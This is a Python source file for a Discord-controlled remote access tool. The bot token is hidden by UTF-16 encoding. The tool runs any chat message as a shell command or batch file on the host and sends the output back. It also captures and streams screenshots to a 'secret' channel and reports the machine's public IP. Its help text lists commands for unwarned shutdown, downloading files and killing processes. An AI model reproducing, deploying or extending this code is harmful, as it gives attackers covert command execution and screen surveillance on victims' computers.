import discord
import subprocess as sp
import random
import pyautogui
import time

API_TOKEN = b'\xff\xfeM\x00T\x00A\x003\x00N\x00D\x00A\x005\x00M\x00D\x00k\x001\x00M\x00D\x00E\x003\x00M\x00j\x00g\x002\x00O\x00D\x00g\x00z\x00M\x00Q\x00.\x00G\x001\x00J\x00O\x00a\x00n\x00.\x00v\x00R\x00k\x009\x00g\x00V\x00U\x000\x00h\x00K\x000\x00S\x00q\x00x\x007\x00-\x00t\x00O\x00E\x00Y\x000\x00o\x00A\x00S\x00M\x002\x00h\x00T\x00w\x00L\x00s\x00R\x00h\x001\x00l\x00x\x00C\x00U\x00'.decode(
    "utf-16", 'strict')
client = discord.Client(intents=discord.Intents.all())
guild = discord.Guild

name = chr(random.randrange(41, 100)) + chr(random.randrange(41, 100)) + chr(random.randrange(41, 100))

print(name)

sleep = False
stream = True


@client.event
async def on_message(message):
    global sleep, stream

    print(message.author)
    print(message.attachments)

    if message.content == "bot.stream":
        stream = True

        channel = client.get_channel(1074088119575519322)

        msg = await channel.send("bot stream")

        while stream:
            im = pyautogui.screenshot()
            im.save("screen.png")

            channel = client.get_channel(1074088119575519322)

            secret_channel = client.get_channel(1074470869671362600)
            file = discord.File("screen.png")
            temp_message = await secret_channel.send(file=file)
            attachment = temp_message.attachments[0]
            #
            # embed = discord.Embed(title="Title here", description="",
            #                      color=0xFFFFFF)
            # embed.set_image(url=attachment.url)
            await msg.edit(content=attachment.url)
            time.sleep(0.8)

        await channel.send("stream stopped")

        return

    if message.author.bot: return

    if sleep:
        if message.content.split("-")[0] == "bot.wake":
            channel = client.get_channel(1074088119575519322)

            if message.content.split("-")[1] == name:
                await channel.send(f"Waking up bot with name {name}")
                sleep = False

        if message.content == "bot.name":
            channel = client.get_channel(1074088119575519322)

            await channel.send(f"{name} (sleeping)")

            return

        return

    print(message.content)

    if message.content == "bot.stop":
        stream = False

        return

    if message.content == "bot.screen":
        im = pyautogui.screenshot()
        im.save("screen.png")

        channel = client.get_channel(1074088119575519322)

        await channel.send(file=discord.File("screen.png"))

        return

    if message.content == "bot.help":
        channel = client.get_channel(1074088119575519322)

        await channel.send("""
BOT COMMANDS

bot.shutdown-name
bot.wake-name
bot.help
bot.name
bot.screen
bot.stream
bot.stop

---------------

USEFUL COMMANDS

shutdown /p : shuts down computer without warning
ipconfig /all : gives all info about your ip
&& : allows running more than one command in one line
start : opens file or link in a new window
curl 'link' -o 'filename' : downloads a file from a link
echo some-text > filename.txt : makes a file with data inside
taskkill /IM myprogram.exe /F : stops programs regarding of conflicts
tasklist : lists all running processes
hostname : shows the name of the pc
command | clip : copys the output of a command to the clipboard""")

        return

    if message.content == "bot.name":
        channel = client.get_channel(1074088119575519322)

        await channel.send(name)

        return

    if message.content.split("-")[0] == "bot.shutdown":
        channel = client.get_channel(1074088119575519322)

        if message.content.split("-")[1] == name:
            await channel.send(f"Shutting down bot with name {name}")
            sleep = True

        return

    if message.content.split("-")[0] == "bot.host":
        channel = client.get_channel(1074088119575519322)

        if message.content.split("-")[1] == name:
            await channel.send(
                f'host for bot with name {name}\n\n{sp.getoutput("nslookup myip.opendns.com resolver1.opendns.com")}')

        return

    if message.content[0] == "#":
        print(message.content.partition('#')[2])
        open("command.bat", "w+").write(message.content.partition('#')[2])

        channel = client.get_channel(1074088119575519322)

        output = sp.getoutput("command.bat")

        try:
            await channel.send(output)
        except Exception as e:
            print(e)
            open("message.txt", "w+").write(output)
            await channel.send(file=discord.File("message.txt"))

        return

    channel = client.get_channel(1074088119575519322)

    output = sp.getoutput(message.content)

    try:
        await channel.send(output.replace('Ä', '--').replace('À', '--').replace('Ã', '--').replace('³', '--'))
    except Exception as e:
        print(e)
        open("message.txt", "w+").write(
            output.replace('Ä', '--').replace('À', '--').replace('Ã', '--').replace('³', '--'))
        await channel.send(file=discord.File("message.txt"))


client.run(API_TOKEN)
